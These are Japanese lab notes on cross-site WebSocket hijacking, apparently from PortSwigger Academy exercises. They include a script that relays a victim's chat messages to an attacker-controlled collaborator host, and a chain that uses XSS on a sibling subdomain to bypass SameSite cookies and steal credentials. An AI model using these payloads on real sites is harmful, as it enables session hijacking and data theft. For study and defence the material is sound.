## CSWSHとは

- cross-origin WSHとしても知られる
- WSのハンドシェイクにCSRF脆弱性を含む [1. CSRFの基本と対策](../CSRF/1.%20CSRFの基本と対策.md)
###### 悪用されるシチュエーション

- WSのハンドシェイクリクエストが、セッション処理のためにHTTP Cookieのみに依存し、CSRF tokenや他の予測不可能な値を含まない場合に発生

###### 攻撃概要

- 攻撃者が自身のドメイン上に悪意あるWebページを作成し、脆弱なWebアプリへのクロスサイトでWebSocket通信を確立する
	- Webアプリは被害者ユーザのセッションコンテキストで接続を処理する

- 攻撃者のページから接続を介してサーバに任意のメッセージを送信し、サーバから返されたデータを読む(情報窃取)

###### CSRFとの違い

- 攻撃者は侵害したWebアプリとの双方向のやりとりを可能にする。
- 通常のCSRFの場合、レスポンスは入手できないけど。

---
## CSWSHの影響

###### 被害者ユーザーになりすまして不正な操作を行える

- まず、攻撃者は適当なメッセージをサーバに送る
- 通常のCSRFと同じで、サーバがクライアント側の入力で重要な処理を行うことがわかれば、攻撃者が悪用目的のメッセージをクロスドメインで送りつけ、アクションを実行させることができる

###### ユーザがアクセスできる機密データの窃取

- 通常のCSRFと異なり、CSWSHはレスポンスを入手できるという特徴を悪用したもの
- Webアプリがサーバ生成の WebSocket メッセージを使ってユーザに機密データを返す場合、攻撃者はそれらのメッセージを傍受し、データをキャプチャできる

## CSWSHの実行

==⚠️==: VSCode上で編集する事。エクスプロイトサーバで編集するとうまく動作しないことがあった

1. エクスプロイトサーバに以下をホストする(`http://TARGET_NET/chat`がLive chat機能の場合)
```js
<script>
    var ws = new WebSocket('wss://TARGET_NET/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://COLLABORATOR_DOMAIN', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
2. View ExploitしてCollaboratorでPoll nowし、Request to collaboratorで自身のLive chat履歴を確認する
3. 被害者にDeliverし、Poll nowすることで、被害者のLive chat履歴を確認する。パスワード等を入手

- これでもCollaboratorで履歴は確認できても有益な情報が得られない時、かつ、Cookieに`SameSite=Strict`が設定されていれば↓へ。

### 脆弱な兄弟ドメインによるSameSite制限の回避

###### 基本原理

- まず、同じ親ドメイン下にある複数のサブドメイン（兄弟ドメイン）は、同じSiteとみなされる。
- たとえば、`example.com`が親ドメインで、`shop.example.com`と`blog.example.com`がそのサブドメイン。これらのサブドメイン間では、クロスSite攻撃として扱われない。(TLD+1の考え)
- つまり、ひとつのサブドメインが脆弱性（XSS等）を持っている場合、攻撃者はその脆弱性を利用して、同じサイトの他の部分に対して攻撃を仕掛けることができる。
- その結果、`SameSite`属性による防護が無効になる
 
- 例えば、`blog.example.com`がXSSに弱い場合、攻撃者はその脆弱性を利用して`shop.example.com`に対して悪意のあるリクエストを発行する。ブラウザはこれを同じサイトのリクエストとして扱うため、`SameSite`属性が設定されているCookieも送信する

###### ステップ

- [LAB](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

1. アプリ探索過程でsvgやjsファイルへのリクエストに対するレスポンスに以下のような兄弟ドメインを確認する
```http
Access-Control-Allow-Origin: https://cms-TARGET_NET
```
2. 確認した兄弟ドメインへアクセスするとログインフォームが表示される
3. ログインフォームの`username`フィールドに以下を注入しリクエスト。XSSが実行されることを確認する[🔍XSS](../XSS/🔍XSS.md#Detect)
```
<script>alert(1)</scrip>
```
4. ステップ3のリクエストをRepeaterへ。Change request methodでGETへ変更し、Copy URLしてブラウザにペースト。GETでもXSS実行を確認
5. [3. cross-site WebSocket hijacking(CSWSH)](3.%20cross-site%20WebSocket%20hijacking(CSWSH).md)のスクリプト全体をURLエンコードする
6. エクスプロイトサーバに以下をホストする
```js
<script>
    document.location = "https://cms-TARGET_NET/login?username=ステップ5でURLエンコードしたスクリプト&password=anything";
</script>
```

7. 被害者にDeliverしCollaboratorで被害者のクレデンシャルを入手する
